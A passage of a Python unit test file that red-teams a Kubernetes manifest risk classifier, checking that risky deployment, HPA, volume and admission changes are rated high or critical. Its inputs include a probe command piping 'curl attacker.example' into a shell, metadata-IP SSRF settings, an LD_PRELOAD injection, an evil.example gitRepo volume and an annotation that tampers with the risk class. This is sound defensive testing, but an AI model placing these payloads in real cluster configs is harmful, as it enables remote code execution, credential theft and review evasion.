"""Unit and adversarial red-team tests for risk_classifier.k8s_rules."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from risk_classifier import (
    ACTION_ADD,
    ACTION_DELETE,
    ACTION_MODIFY,
    BLAST_CRITICAL,
    BLAST_HIGH,
    BLAST_LOW,
    BLAST_MEDIUM,
    BLAST_UNKNOWN,
    CHANGE_ADDED,
    CHANGE_DELETED,
    CHANGE_MODIFIED,
    DISRUPT_DESTRUCTIVE,
    DISRUPT_DISRUPTIVE,
    DISRUPT_NONE,
    DISRUPT_UNKNOWN,
    REVERT_DIFFICULT,
    REVERT_EASY,
    REVERT_IRREVERSIBLE,
    REVERT_MODERATE,
    REVERT_UNKNOWN,
    RISK_CRITICAL,
    RISK_HIGH,
    RISK_LOW,
    RISK_MEDIUM,
    RISK_UNKNOWN,
    FileChange,
    ResourceRef,
    classify_changes,
)
from risk_classifier.k8s_rules import (
    CORE_KNOWN_KINDS,
    _is_production_labels,
    _is_production_path,
    evaluate_resource,
    is_cluster_scoped_kind,
)
from risk_classifier.parser import ParsedResource

BASE_DEPLOY = """\
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
  namespace: shop
  labels:
    app: web
spec:
  replicas: 4
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      serviceAccountName: web-sa
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
      containers:
        - name: app
          image: gcr.io/acme/web:v1.2.3
          ports:
            - name: http
              containerPort: 8080
          resources:
            requests:
              cpu: "100m"
              memory: "128Mi"
            limits:
              cpu: "500m"
              memory: "512Mi"
          readinessProbe:
            httpGet:
              path: /healthz
              port: http
"""

BASE_HPA = """\
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: web-hpa
  namespace: shop
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: web
  minReplicas: 2
  maxReplicas: 6
"""

BASE_CM = """\
apiVersion: v1
kind: ConfigMap
metadata:
  name: web-config
  namespace: shop
data:
  LOG_LEVEL: info
"""


def _add(path: str, after: str) -> FileChange:
    return FileChange(
        path=path,
        change_type=CHANGE_ADDED,
        before=None,
        after=after.encode("utf-8"),
        after_mode="100644",
    )


def _mod(path: str, before: str, after: str) -> FileChange:
    return FileChange(
        path=path,
        change_type=CHANGE_MODIFIED,
        before=before.encode("utf-8"),
        after=after.encode("utf-8"),
        before_mode="100644",
        after_mode="100644",
    )


def _del(path: str, before: str) -> FileChange:
    return FileChange(
        path=path,
        change_type=CHANGE_DELETED,
        before=before.encode("utf-8"),
        after=None,
        before_mode="100644",
    )


def _minimal_resource_for_gk(group: str, kind: str, *, variant: int = 0) -> ParsedResource:
    version_map = {
        "": "v1",
        "apps": "v1",
        "batch": "v1",
        "policy": "v1",
        "autoscaling": "v2",
        "autoscaling.k8s.io": "v1",
    }
    ver = version_map.get(group, "v1")
    api_version = f"{group}/{ver}" if group else ver
    ns = "" if is_cluster_scoped_kind(group, kind) else "shop"
    tag = "v1.0.1" if variant else "v1.0.0"

    meta: dict[str, object] = {"name": "sample"}
    if ns:
        meta["namespace"] = ns

    obj: dict[str, object] = {"apiVersion": api_version, "kind": kind, "metadata": meta}
    if kind in ("Deployment", "StatefulSet", "DaemonSet", "ReplicaSet", "ReplicationController"):
        obj["spec"] = {
            "replicas": 2 + variant,
            "selector": {"matchLabels": {"app": "s"}} if kind != "ReplicationController" else {"app": "s"},
            "template": {
                "metadata": {"labels": {"app": "s"}},
                "spec": {"containers": [{"name": "c", "image": f"gcr.io/acme/app:{tag}"}]},
            },
        }
    elif kind == "Job":
        obj["spec"] = {"template": {"spec": {"containers": [{"name": "c", "image": f"gcr.io/acme/app:{tag}"}]}}}
    elif kind == "CronJob":
        obj["spec"] = {
            "schedule": "0 * * * *",
            "jobTemplate": {"spec": {"template": {"spec": {"containers": [{"name": "c", "image": f"gcr.io/acme/app:{tag}"}]}}}},
        }
    elif kind == "Pod":
        obj["spec"] = {"containers": [{"name": "c", "image": f"gcr.io/acme/app:{tag}"}]}
    elif kind == "PodTemplate":
        obj["template"] = {"spec": {"containers": [{"name": "c", "image": f"gcr.io/acme/app:{tag}"}]}}
    elif kind == "HorizontalPodAutoscaler":
        obj["spec"] = {
            "scaleTargetRef": {"apiVersion": "apps/v1", "kind": "Deployment", "name": "web"},
            "minReplicas": 2,
            "maxReplicas": 4 + variant,
        }
    elif kind == "PodDisruptionBudget":
        obj["spec"] = {"maxUnavailable": 1, "selector": {"matchLabels": {"app": "s"}}}
    elif kind == "ConfigMap":
        obj["data"] = {"K": f"v{variant}"}
    else:
        obj["spec"] = {"field": variant}

    ref = ResourceRef(group=group, version=ver, kind=kind, namespace=ns, name="sample")
    return ParsedResource(ref=ref, obj=obj, sanitized=obj)


class RegistryCompletenessAndFailClosedTests(unittest.TestCase):
    """Verify 100% of CORE_KNOWN_KINDS have explicit handlers and unmodeled fallbacks fail closed."""

    def test_every_core_known_kind_has_explicit_handler_for_add_modify_delete(self) -> None:
        for group, kind in sorted(CORE_KNOWN_KINDS):
            r0 = _minimal_resource_for_gk(group, kind, variant=0)
            r1 = _minimal_resource_for_gk(group, kind, variant=1)
            for action, b_res, a_res in (
                (ACTION_ADD, None, r0),
                (ACTION_MODIFY, r0, r1),
                (ACTION_DELETE, r0, None),
            ):
                with self.subTest(group=group, kind=kind, action=action):
                    ev = evaluate_resource("clusters/dev/res.yaml", action, b_res, a_res)
                    codes = {r.code for r in ev.reasons}
                    self.assertNotIn(
                        "UNMODELED_RESOURCE_CHANGE",
                        codes,
                        f"{group}/{kind} on {action} fell through to UNMODELED_RESOURCE_CHANGE",
                    )
                    for reason in ev.reasons:
                        self.assertNotIn(
                            "modifys",
                            reason.message.lower(),
                            f"{group}/{kind} on {action} emitted typo 'modifys': {reason.message!r}",
                        )

    def test_no_modifys_typo_in_source_or_modify_verdicts(self) -> None:
        k8s_rules_src = (Path(__file__).resolve().parent / "risk_classifier" / "k8s_rules.py").read_text(encoding="utf-8")
        self.assertNotIn("modifys", k8s_rules_src)
        self.assertNotIn("{action}s ", k8s_rules_src)
        self.assertNotIn("action + 's'", k8s_rules_src)
        self.assertNotIn('action + "s"', k8s_rules_src)

        extra_modify_docs = (
            "apiVersion: persona.kube-agents.x-k8s.io/v1alpha1\nkind: AgentProfile\nmetadata:\n  name: p\n  namespace: kubeagents-system\nspec:\n  role: a\n",
            "apiVersion: custom.acme.io/v1\nkind: Widget\nmetadata:\n  name: w\n  namespace: kube-system\nspec:\n  v: 1\n",
            "apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: pol\nspec:\n  validationFailureAction: Enforce\n",
            "apiVersion: sql.cnrm.cloud.google.com/v1beta1\nkind: SQLInstance\nmetadata:\n  name: db\n  namespace: shop\nspec:\n  region: us-central1\n",
            "apiVersion: networking.istio.io/v1\nkind: VirtualService\nmetadata:\n  name: vs\n  namespace: shop\nspec:\n  hosts: [web]\n",
            "apiVersion: cert-manager.io/v1\nkind: Certificate\nmetadata:\n  name: cert\n  namespace: shop\nspec:\n  secretName: tls\n",
        )
        for doc in extra_modify_docs:
            after_mod = doc + "  extraField: 2\n"
            r = classify_changes([_mod("clusters/dev/m.yaml", doc, after_mod)])
            for reason in r.reasons:
                self.assertNotIn("modifys", reason.message.lower(), reason.message)
            self.assertTrue(
                any("modifies " in reason.message for reason in r.reasons),
                f"expected 'modifies ' in reasons for {doc.splitlines()[1]}: {[x.message for x in r.reasons]}",
            )

    def test_volume_attachment_and_csinode_are_high_difficult_revert_not_medium(self) -> None:
        va = """\
apiVersion: storage.k8s.io/v1
kind: VolumeAttachment
metadata:
  name: attach-prod-pv
spec:
  attacher: pd.csi.storage.gke.io
  nodeName: node-1
  source:
    persistentVolumeName: prod-pv
"""
        csinode = """\
apiVersion: storage.k8s.io/v1
kind: CSINode
metadata:
  name: node-1
spec:
  drivers: []
"""
        for doc in (va, csinode):
            r = classify_changes([_add("clusters/dev/storage.yaml", doc)])
            self.assertEqual(r.risk_level, RISK_HIGH)
            self.assertEqual(r.blast_radius, BLAST_HIGH)
            self.assertEqual(r.revertability, REVERT_DIFFICULT)
            self.assertTrue(r.supported)


class ActionAddAutoMergeGuardTests(unittest.TestCase):
    """Verify ACTION_ADD workloads and HPAs cannot smuggle risky specs under max_risk: medium."""

    def test_new_deployment_extreme_zero_or_invalid_replicas_are_high(self) -> None:
        r_500 = classify_changes([_add("clusters/dev/web.yaml", BASE_DEPLOY.replace("replicas: 4", "replicas: 500"))])
        self.assertEqual(r_500.risk_level, RISK_HIGH)
        self.assertEqual(r_500.blast_radius, BLAST_HIGH)

        r_zero = classify_changes([_add("clusters/dev/web.yaml", BASE_DEPLOY.replace("replicas: 4", "replicas: 0"))])
        self.assertEqual(r_zero.risk_level, RISK_HIGH)
        self.assertEqual(r_zero.disruptiveness, DISRUPT_DISRUPTIVE)

        r_bad = classify_changes([_add("clusters/dev/web.yaml", BASE_DEPLOY.replace("replicas: 4", 'replicas: "bad"'))])
        self.assertEqual(r_bad.risk_level, RISK_HIGH)
        self.assertEqual(r_bad.disruptiveness, DISRUPT_DISRUPTIVE)

    def test_new_deployment_with_mutable_image_sets_revertability_unknown(self) -> None:
        r_lat = classify_changes([_add("clusters/dev/web.yaml", BASE_DEPLOY.replace("v1.2.3", "latest"))])
        self.assertEqual(r_lat.risk_level, RISK_MEDIUM)
        self.assertEqual(r_lat.revertability, REVERT_UNKNOWN)

        r_pinned = classify_changes([_add("clusters/dev/web.yaml", BASE_DEPLOY)])
        self.assertEqual(r_pinned.risk_level, RISK_MEDIUM)
        self.assertEqual(r_pinned.revertability, REVERT_EASY)

    def test_new_deployment_invalid_or_extreme_container_resources_and_capacity_delta(self) -> None:
        # Request > limit on ADD -> HIGH disruptive
        r_exceed = classify_changes([_add("clusters/dev/web.yaml", BASE_DEPLOY.replace('cpu: "100m"', 'cpu: "900m"'))])
        self.assertEqual(r_exceed.risk_level, RISK_HIGH)
        self.assertEqual(r_exceed.disruptiveness, DISRUPT_DISRUPTIVE)

        # Extreme single-container CPU (>8000m) -> HIGH
        extreme = BASE_DEPLOY.replace('cpu: "100m"', 'cpu: "16000m"').replace('cpu: "500m"', 'cpu: "32000m"')
        r_ext = classify_changes([_add("clusters/dev/web.yaml", extreme)])
        self.assertEqual(r_ext.risk_level, RISK_HIGH)

    def test_new_statefulset_with_vct_and_delete_retention_policy(self) -> None:
        sts = """\
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: db
  namespace: shop
spec:
  serviceName: db
  replicas: 2
  selector:
    matchLabels:
      app: db
  template:
    metadata:
      labels:
        app: db
    spec:
      containers:
        - name: pg
          image: gcr.io/acme/pg:16.2.1
  volumeClaimTemplates:
    - metadata:
        name: data
      spec:
        accessModes: [ReadWriteOnce]
        resources:
          requests:
            storage: 10Gi
"""
        r_add = classify_changes([_add("clusters/dev/sts.yaml", sts)])
        self.assertEqual(r_add.risk_level, RISK_MEDIUM)
        self.assertEqual(r_add.revertability, REVERT_DIFFICULT)

        sts_del = sts.replace(
            "replicas: 2",
            "replicas: 2\n  persistentVolumeClaimRetentionPolicy:\n    whenScaled: Delete",
        )
        r_del_pol = classify_changes([_add("clusters/dev/sts.yaml", sts_del)])
        self.assertEqual(r_del_pol.risk_level, RISK_HIGH)
        self.assertEqual(r_del_pol.disruptiveness, DISRUPT_DESTRUCTIVE)

    def test_hpa_validation_on_add_and_null_minreplicas_evasion_on_modify(self) -> None:
        # ADD invalid HPA (min > max, min=0, max=100)
        self.assertEqual(
            classify_changes([_add("clusters/dev/hpa.yaml", BASE_HPA.replace("minReplicas: 2", "minReplicas: 10"))]).risk_level,
            RISK_HIGH,
        )
        self.assertEqual(
            classify_changes([_add("clusters/dev/hpa.yaml", BASE_HPA.replace("minReplicas: 2", "minReplicas: 0"))]).risk_level,
            RISK_HIGH,
        )
        self.assertEqual(
            classify_changes([_add("clusters/dev/hpa.yaml", BASE_HPA.replace("maxReplicas: 6", "maxReplicas: 100"))]).risk_level,
            RISK_HIGH,
        )

        # MODIFY evasion: minReplicas 10 -> null (defaults to 1, 90% drop) + allowlisted annotation -> HIGH disruptive
        hpa_10 = BASE_HPA.replace("minReplicas: 2", "minReplicas: 10").replace("maxReplicas: 6", "maxReplicas: 20")
        hpa_null = (
            "apiVersion: autoscaling/v2\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: web-hpa\n"
            "  namespace: shop\n  annotations:\n    owner: sre\nspec:\n  scaleTargetRef:\n"
            "    apiVersion: apps/v1\n    kind: Deployment\n    name: web\n  minReplicas: null\n  maxReplicas: 20\n"
        )
        r_null = classify_changes([_mod("clusters/dev/hpa.yaml", hpa_10, hpa_null)])
        self.assertEqual(r_null.risk_level, RISK_HIGH)
        self.assertEqual(r_null.disruptiveness, DISRUPT_DISRUPTIVE)

        # MODIFY evasion: removing maxReplicas -> HIGH disruptive
        hpa_no_max = hpa_10.replace("  maxReplicas: 20\n", "")
        self.assertEqual(classify_changes([_mod("clusters/dev/hpa.yaml", hpa_10, hpa_no_max)]).risk_level, RISK_HIGH)

        # MODIFY evasion: minReplicas 1 -> 20 jump is MEDIUM (not LOW), while maxReplicas 6 -> 8 stays LOW
        hpa_1 = BASE_HPA.replace("minReplicas: 2", "minReplicas: 1").replace("maxReplicas: 6", "maxReplicas: 20")
        hpa_jump = hpa_1.replace("minReplicas: 1", "minReplicas: 20")
        self.assertEqual(classify_changes([_mod("clusters/dev/hpa.yaml", hpa_1, hpa_jump)]).risk_level, RISK_MEDIUM)
        self.assertEqual(
            classify_changes([_mod("clusters/dev/hpa.yaml", BASE_HPA, BASE_HPA.replace("maxReplicas: 6", "maxReplicas: 8"))]).risk_level,
            RISK_LOW,
        )


class PodAndContainerSecuritySmugglingTests(unittest.TestCase):
    """Test container/initContainer/ephemeralContainer parity, probes, env, volumes, and securityContext."""

    def test_probe_exec_rce_and_kubelet_host_ssrf_are_high(self) -> None:
        exec_probe = (
            "          readinessProbe:\n"
            "            exec:\n"
            '              command: ["/bin/sh", "-c", "curl attacker.example | sh"]\n'
        )
        after_exec = BASE_DEPLOY.split("          readinessProbe:")[0] + exec_probe
        for target_doc in (
            _mod("clusters/dev/web.yaml", BASE_DEPLOY, after_exec),
            _add("clusters/dev/web.yaml", after_exec),
        ):
            r = classify_changes([target_doc])
            self.assertEqual(r.risk_level, RISK_HIGH)
            self.assertIn("PROBE_EXEC_COMMAND_CHANGED", {x.code for x in r.reasons})

        # Kubelet probe httpGet.host SSRF
        ssrf_after = BASE_DEPLOY.replace("path: /healthz", "path: /computeMetadata/v1/\n              host: 169.254.169.254")
        r_ssrf = classify_changes([_mod("clusters/dev/web.yaml", BASE_DEPLOY, ssrf_after)])
        self.assertEqual(r_ssrf.risk_level, RISK_HIGH)
        self.assertIn("PROBE_HOST_SSRF_RISK", {x.code for x in r_ssrf.reasons})

    def test_container_dangerous_env_and_camel_case_secret_keys(self) -> None:
        # LD_PRELOAD and NODE_TLS_REJECT_UNAUTHORIZED on container env -> HIGH
        for env_k, env_v in (("LD_PRELOAD", "/tmp/pwn.so"), ("NODE_TLS_REJECT_UNAUTHORIZED", "0"), ("PYTHONPATH", "/tmp/evil")):
            after = BASE_DEPLOY + f'          env:\n            - name: {env_k}\n              value: "{env_v}"\n'
            r = classify_changes([_mod("clusters/dev/web.yaml", BASE_DEPLOY, after)])
            self.assertEqual(r.risk_level, RISK_HIGH, env_k)
            self.assertIn("DANGEROUS_RUNTIME_CONFIG_KEY", {x.code for x in r.reasons})

        # Literal value on camelCase secret env key -> CRITICAL irreversible
        for secret_k in ("dbPassword", "stripeApiKey", "clientSecret", "privateKeyPem", "refreshToken", "accessToken"):
            after_sec = BASE_DEPLOY + f'          env:\n            - name: {secret_k}\n              value: "s3cr3t-val"\n'
            r_sec = classify_changes([_mod("clusters/dev/web.yaml", BASE_DEPLOY, after_sec)])
            self.assertEqual(r_sec.risk_level, RISK_CRITICAL, secret_k)
            self.assertEqual(r_sec.revertability, REVERT_IRREVERSIBLE, secret_k)

            # Same camelCase keys in ConfigMap -> CRITICAL irreversible
            cm_after = BASE_CM + f'  {secret_k}: "s3cr3t-val"\n'
            r_cm = classify_changes([_mod("clusters/dev/cm.yaml", BASE_CM, cm_after)])
            self.assertEqual(r_cm.risk_level, RISK_CRITICAL, secret_k)

        # Embedded password URI in ConfigMap -> CRITICAL
        cm_uri = BASE_CM + '  DB_DSN: "postgres://app:SuperS3cret@10.0.0.12:5432/prod"\n'
        self.assertEqual(classify_changes([_mod("clusters/dev/cm.yaml", BASE_CM, cm_uri)]).risk_level, RISK_CRITICAL)

    def test_existing_unchanged_secret_ref_allows_low_risk_pinned_image_bump(self) -> None:
        dep_with_sec = BASE_DEPLOY + (
            "          env:\n"
            "            - name: DB_PASS\n"
            "              valueFrom:\n"
            "                secretKeyRef:\n"
            "                  name: db-sec\n"
            "                  key: password\n"
            "      volumes:\n"
            "        - name: tls\n"
            "          secret:\n"
            "            secretName: web-tls\n"
        )
        # Pure pinned image bump on workload with existing unchanged secret -> LOW (rolling pod restart is disruptive)!
        r_bump = classify_changes(
            [_mod("clusters/dev/web.yaml", dep_with_sec, dep_with_sec.replace("v1.2.3", "v1.2.4"))]
        )
        self.assertEqual(r_bump.risk_level, RISK_LOW)
        self.assertEqual(r_bump.disruptiveness, DISRUPT_DISRUPTIVE)

        # Changing WHICH secret is mounted -> HIGH!
        r_swap = classify_changes(
            [_mod("clusters/dev/web.yaml", dep_with_sec, dep_with_sec.replace("secretName: web-tls", "secretName: admin-tls"))]
        )
        self.assertEqual(r_swap.risk_level, RISK_HIGH)

        # Mounting existing secret volume into container volumeMounts -> HIGH!
        mounted = dep_with_sec.replace(
            "          ports:\n",
            "          volumeMounts:\n            - name: tls\n              mountPath: /etc/tls\n          ports:\n",
        )
        self.assertEqual(classify_changes([_mod("clusters/dev/web.yaml", dep_with_sec, mounted)]).risk_level, RISK_HIGH)

    def test_init_and_ephemeral_container_parity(self) -> None:
        dep_init = BASE_DEPLOY + (
            "      initContainers:\n"
            "        - name: migrate\n"
            "          image: gcr.io/acme/migrate:v1.0.0\n"
        )
        # Pinned semver bump on initContainer -> LOW
        r_ok = classify_changes([_mod("clusters/dev/web.yaml", dep_init, dep_init.replace("v1.0.0", "v1.0.1"))])
        self.assertEqual(r_ok.risk_level, RISK_LOW)

        # Privileged or dangerous env on initContainer or ephemeralContainer -> HIGH/CRITICAL
        r_priv = classify_changes(
            [
                _mod(
                    "clusters/dev/web.yaml",
                    dep_init,
                    dep_init + "          securityContext:\n            privileged: true\n",
                )
            ]
        )
        self.assertEqual(r_priv.risk_level, RISK_HIGH)

        eph_add = BASE_DEPLOY + (
            "      ephemeralContainers:\n"
            "        - name: dbg\n"
            "          image: gcr.io/acme/dbg:v1.0.0\n"
        )
        self.assertEqual(classify_changes([_add("clusters/dev/web.yaml", eph_add)]).risk_level, RISK_HIGH)

    def test_hostusers_uid_gid_procmount_and_digest_pin_downgrade(self) -> None:
        # hostUsers: false on ADD is hardened -> stays MEDIUM (not penalized as HIGH)
        hardened_userns = BASE_DEPLOY.replace("      serviceAccountName: web-sa\n", "      hostUsers: false\n      serviceAccountName: web-sa\n")
        self.assertEqual(classify_changes([_add("clusters/dev/web.yaml", hardened_userns)]).risk_level, RISK_MEDIUM)

        # Removing hostUsers: false or setting hostUsers: true -> HIGH SECURITY_HARDENING_REMOVED
        r_rm_hu = classify_changes([_mod("clusters/dev/web.yaml", hardened_userns, BASE_DEPLOY)])
        self.assertEqual(r_rm_hu.risk_level, RISK_HIGH)
        self.assertIn("SECURITY_HARDENING_REMOVED", {x.code for x in r_rm_hu.reasons})

        # Non-bool hostUsers -> HIGH
        bad_hu = BASE_DEPLOY.replace("      serviceAccountName: web-sa\n", '      hostUsers: "no"\n      serviceAccountName: web-sa\n')
        self.assertEqual(classify_changes([_add("clusters/dev/web.yaml", bad_hu)]).risk_level, RISK_HIGH)

        # Removing runAsUser: 1000 (even when runAsNonRoot was absent) -> HIGH SECURITY_HARDENING_REMOVED
        uid_only = BASE_DEPLOY.replace("        runAsNonRoot: true\n", "")
        uid_removed = uid_only.replace("      securityContext:\n        runAsUser: 1000\n", "")
        r_uid = classify_changes([_mod("clusters/dev/web.yaml", uid_only, uid_removed)])
        self.assertEqual(r_uid.risk_level, RISK_HIGH)
        self.assertIn("SECURITY_HARDENING_REMOVED", {x.code for x in r_uid.reasons})

        # runAsGroup: 0, runAsUser: "0", procMount: unmasked -> HIGH
        for sc_snippet in (
            "          securityContext:\n            runAsGroup: 0\n",
            '          securityContext:\n            runAsUser: "0"\n',
            "          securityContext:\n            procMount: unmasked\n",
        ):
            after = BASE_DEPLOY.replace("          ports:\n", sc_snippet + "          ports:\n")
            self.assertEqual(classify_changes([_mod("clusters/dev/web.yaml", BASE_DEPLOY, after)]).risk_level, RISK_HIGH, sc_snippet)

        # Stripping @sha256: digest down to :v1.2.4 tag -> MEDIUM (IMAGE_DIGEST_PIN_REMOVED)
        pinned_digest = BASE_DEPLOY.replace("gcr.io/acme/web:v1.2.3", "gcr.io/acme/web@sha256:" + "a" * 64)
        self.assertEqual(
            classify_changes([_mod("clusters/dev/web.yaml", pinned_digest, BASE_DEPLOY.replace("v1.2.3", "v1.2.4"))]).risk_level,
            RISK_MEDIUM,
        )

    def test_volume_smuggling_and_equal_length_component_swaps(self) -> None:
        # gitRepo volume -> CRITICAL; nfs/iscsi/fc/csi/image/volumeDevices -> HIGH
        git_vol = BASE_DEPLOY + "      volumes:\n        - name: g\n          gitRepo:\n            repository: https://evil.example/r.git\n"
        self.assertEqual(classify_changes([_add("clusters/dev/web.yaml", git_vol)]).risk_level, RISK_CRITICAL)

        for vol_yaml in (
            "      volumes:\n        - name: v\n          nfs:\n            server: 10.0.0.1\n            path: /export\n",
            "      volumes:\n        - name: v\n          iscsi:\n            targetPortal: 10.0.0.1:3260\n            iqn: iqn.2026.io:t\n",
            "      volumes:\n        - name: v\n          fc:\n            targetWWNs: [50060e801049cfd1]\n            lun: 0\n",
            "      volumes:\n        - name: v\n          csi:\n            driver: gcsfuse.csi.storage.gke.io\n",
            "      volumes:\n        - name: v\n          image:\n            reference: gcr.io/acme/data:v1.0.0\n",
        ):
            self.assertEqual(classify_changes([_add("clusters/dev/web.yaml", BASE_DEPLOY + vol_yaml)]).risk_level, RISK_HIGH, vol_yaml)

        blk_dev = BASE_DEPLOY.replace("          ports:\n", "          volumeDevices:\n            - name: raw\n              devicePath: /dev/xvda\n          ports:\n")
        self.assertEqual(classify_changes([_add("clusters/dev/web.yaml", blk_dev)]).risk_level, RISK_HIGH)

        # Equal-length containerPort swap (8080 -> 9090) -> HIGH disruptive CONTAINER_COMPONENT_REMOVED
        port_swap = BASE_DEPLOY.replace("containerPort: 8080", "containerPort: 9090")
        r_port = classify_changes([_mod("clusters/dev/web.yaml", BASE_DEPLOY, port_swap)])
        self.assertEqual(r_port.risk_level, RISK_HIGH)
        self.assertEqual(r_port.disruptiveness, DISRUPT_DISRUPTIVE)
        self.assertIn("CONTAINER_COMPONENT_REMOVED", {x.code for x in r_port.reasons})

    def test_metadata_add_finalizers_ownerrefs_and_pod_template_protected_annotations(self) -> None:
        for bad_cm in (
            BASE_CM.replace("  namespace: shop\n", "  namespace: shop\n  finalizers:\n    - evil.io/lock\n"),
            BASE_CM.replace("  namespace: shop\n", "  namespace: shop\n  ownerReferences:\n    - apiVersion: v1\n      kind: Pod\n      name: gone\n      uid: '1'\n"),
            BASE_CM.replace("  namespace: shop\n", "  namespace: shop\n  annotations:\n    argocd.argoproj.io/hook: PreSync\n"),
        ):
            r = classify_changes([_add("clusters/dev/cm.yaml", bad_cm)])
            self.assertEqual(r.risk_level, RISK_HIGH, bad_cm)

        tamper_cm = BASE_CM.replace("  namespace: shop\n", "  namespace: shop\n  annotations:\n    kube-agents/risk-class: low\n")
        self.assertEqual(classify_changes([_add("clusters/dev/cm.yaml", tamper_cm)]).risk_level, RISK_CRITICAL)

        # Pod template annotation disabling Istio sidecar or AppArmor -> HIGH
        no_sidecar = BASE_DEPLOY.replace(
            "      labels:\n        app: web\n",
            '      labels:\n        app: web\n      annotations:\n        sidecar.istio.io/inject: "false"\n',
        )
        self.assertEqual(classify_changes([_mod("clusters/dev/web.yaml", BASE_DEPLOY, no_sidecar)]).risk_level, RISK_HIGH)

        # ConfigMap bogus apiVersion -> UNKNOWN (not LOW!)
        self.assertEqual(
            classify_changes([_add("clusters/dev/cm.yaml", BASE_CM.replace("apiVersion: v1", "apiVersion: v999"))]).risk_level,
            RISK_UNKNOWN,
        )


class HighImpactK8sAndGkeKindsTests(unittest.TestCase):
    """Test newly modeled Kubernetes 1.30+, DRA, Gateway API, GKE, Lease, CSR, and GMP kinds."""

    def test_admission_flowcontrol_csr_trustbundle_tokenrequest_and_audit(self) -> None:
        critical_manifests = [
            "apiVersion: admissionregistration.k8s.io/v1alpha1\nkind: MutatingAdmissionPolicy\nmetadata:\n  name: map-1\nspec:\n  mutations: []\n",
            "apiVersion: admissionregistration.k8s.io/v1alpha1\nkind: MutatingAdmissionPolicyBinding\nmetadata:\n  name: mapb-1\nspec:\n  policyName: map-1\n",
            "apiVersion: flowcontrol.apiserver.k8s.io/v1\nkind: FlowSchema\nmetadata:\n  name: fs-1\nspec: {}\n",
            "apiVersion: flowcontrol.apiserver.k8s.io/v1\nkind: PriorityLevelConfiguration\nmetadata:\n  name: plc-1\nspec: {}\n",
            "apiVersion: certificates.k8s.io/v1\nkind: CertificateSigningRequest\nmetadata:\n  name: csr-1\nspec: {}\n",
            "apiVersion: certificates.k8s.io/v1alpha1\nkind: ClusterTrustBundle\nmetadata:\n  name: ctb-1\nspec: {}\n",
            "apiVersion: authentication.k8s.io/v1\nkind: TokenRequest\nmetadata:\n  name: tok-1\n  namespace: shop\nspec: {}\n",
            "apiVersion: audit.k8s.io/v1\nkind: Policy\nmetadata:\n  name: audit-pol\nrules: []\n",
            "apiVersion: persona.kube-agents.x-k8s.io/v1alpha1\nkind: AgentProfile\nmetadata:\n  name: cluster\n  namespace: kubeagents-system\nspec: {}\n",
        ]
        for doc in critical_manifests:
            with self.subTest(doc=doc.splitlines()[1]):
                r = classify_changes([_add("clusters/dev/ctrl.yaml", doc)])
                self.assertEqual(r.risk_level, RISK_CRITICAL)
                self.assertTrue(r.supported)

    def test_lease_ipam_endpoints_ssrf_and_dra_kinds(self) -> None:
        # Lease in kube-node-lease -> CRITICAL disruptive; in app ns -> HIGH
        node_lease = "apiVersion: coordination.k8s.io/v1\nkind: Lease\nmetadata:\n  name: node-1\n  namespace: kube-node-lease\nspec: {}\n"
        r_nl = classify_changes([_mod("clusters/dev/lease.yaml", node_lease, node_lease.replace("{}", "{leaseDurationSeconds: 1}"))])
        self.assertEqual(r_nl.risk_level, RISK_CRITICAL)
        self.assertEqual(r_nl.disruptiveness, DISRUPT_DISRUPTIVE)

        app_lease = node_lease.replace("kube-node-lease", "shop")
        self.assertEqual(classify_changes([_add("clusters/dev/lease.yaml", app_lease)]).risk_level, RISK_HIGH)

        # ServiceCIDR & IPAddress -> CRITICAL
        scidr = "apiVersion: networking.k8s.io/v1\nkind: ServiceCIDR\nmetadata:\n  name: default\nspec:\n  cidrs: [10.96.0.0/12]\n"
        self.assertEqual(classify_changes([_add("clusters/dev/cidr.yaml", scidr)]).risk_level, RISK_CRITICAL)
        self.assertEqual(classify_changes([_del("clusters/dev/cidr.yaml", scidr)]).disruptiveness, DISRUPT_DESTRUCTIVE)

        # Endpoints pointing to 169.254.169.254 metadata IP -> CRITICAL SSRF
        ep_ssrf = (
            "apiVersion: v1\nkind: Endpoints\nmetadata:\n  name: ext-svc\n  namespace: shop\n"
            "subsets:\n  - addresses:\n      - ip: 169.254.169.254\n    ports:\n      - port: 80\n"
        )
        self.assertEqual(classify_changes([_add("clusters/dev/ep.yaml", ep_ssrf)]).risk_level, RISK_CRITICAL)

        # DRA kinds
        for dra_doc, expected in (
            ("apiVersion: resource.k8s.io/v1beta1\nkind: DeviceClass\nmetadata:\n  name: gpu\nspec: {}\n", RISK_HIGH),
            ("apiVersion: resource.k8s.io/v1beta1\nkind: ResourceSlice\nmetadata:\n  name: node-gpu\nspec: {}\n", RISK_CRITICAL),
            ("apiVersion: resource.k8s.io/v1beta1\nkind: ResourceClaim\nmetadata:\n  name: rc\n  namespace: shop\nspec: {}\n", RISK_HIGH),
            ("apiVersion: resource.k8s.io/v1beta1\nkind: ResourceClaimTemplate\nmetadata:\n  name: rct\n  namespace: shop\nspec: {}\n", RISK_HIGH),
        ):
            r_dra = classify_changes([_add("clusters/dev/dra.yaml", dra_doc)])
            self.assertEqual(r_dra.risk_level, expected)
            self.assertTrue(r_dra.supported)

    def test_gateway_api_gke_networking_compute_gmp_and_podtemplate(self) -> None:
        # Gateway API BackendTLSPolicy & BackendLBPolicy -> HIGH supported (not UNKNOWN!)
        for gw_kind in ("BackendTLSPolicy", "BackendLBPolicy"):
            doc = f"apiVersion: gateway.networking.k8s.io/v1alpha3\nkind: {gw_kind}\nmetadata:\n  name: p1\n  namespace: shop\nspec: {{}}\n"
            r = classify_changes([_add("clusters/dev/gw.yaml", doc)])
            self.assertEqual(r.risk_level, RISK_HIGH)
            self.assertTrue(r.supported)

        # GKE GCPBackendPolicy removing Cloud Armor securityPolicy -> CRITICAL
        gcp_bp_b = (
            "apiVersion: networking.gke.io/v1\nkind: GCPBackendPolicy\nmetadata:\n  name: web-bp\n  namespace: shop\n"
            "spec:\n  default:\n    securityPolicy: prod-waf\n  securityPolicy: prod-waf\n"
        )
